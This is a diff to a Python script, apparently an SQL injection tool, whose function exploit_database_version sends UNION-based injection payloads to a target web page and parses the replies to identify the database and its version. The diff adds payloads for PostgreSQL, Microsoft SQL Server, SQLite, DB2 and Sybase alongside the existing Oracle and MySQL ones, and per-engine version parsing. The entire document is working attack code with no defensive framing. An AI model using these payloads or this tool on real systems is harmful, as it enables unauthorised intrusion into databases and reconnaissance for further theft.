@@ -110,8 +110,13 @@ def find_urls_to_test(url, base_url):
 def exploit_database_version(url):
     
     database_types = {
-        'Oracle': "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
-        'MySQL': " UNION SELECT @@version, NULL%23",  
+    'Oracle': "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
+    'MySQL': " UNION SELECT @@version, NULL%23",
+    'PostgreSQL': "' UNION SELECT version(), NULL--",
+    'Microsoft SQL Server': "' UNION SELECT @@version, NULL--",
+    'SQLite': "' UNION SELECT sqlite_version(), NULL--",
+    'DB2': "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
+    'Sybase': "' UNION SELECT @@version, NULL--"
     }
 
     try:
@@ -139,17 +144,35 @@ def exploit_database_version(url):
             if re.search(db_type, response.text, re.IGNORECASE):
                 soup = BeautifulSoup(response.text, 'html.parser')
 
-                version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
-                version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
-
-                if version_oracle:
-                    print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
-                elif version_generic:
-                    print(f"[+] Found the database: {db_type} | The version is: {version_generic.strip()}")
-                else:
-                    print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
-
-                return  # Sale si encuentra la base de datos y la versión
+                if db_type == 'Oracle':
+                    version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+                    if version_oracle:
+                        print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
+                        return
+                elif db_type == 'MySQL' or db_type == 'Microsoft SQL Server' or db_type == 'Sybase':
+                    version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+                    if version_generic:
+                        version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
+                        if version_number:
+                            print(f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
+                            return
+                elif db_type == 'PostgreSQL':
+                    version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
+                    if version_postgres:
+                        print(f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
+                        return
+                elif db_type == 'SQLite':
+                    version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
+                    if version_sqlite:
+                        print(f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
+                        return
+                elif db_type == 'DB2':
+                    version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
+                    if version_db2:
+                        print(f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
+                        return
+                
+                print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
         
         print("[-] Could not detect the database type.")
     
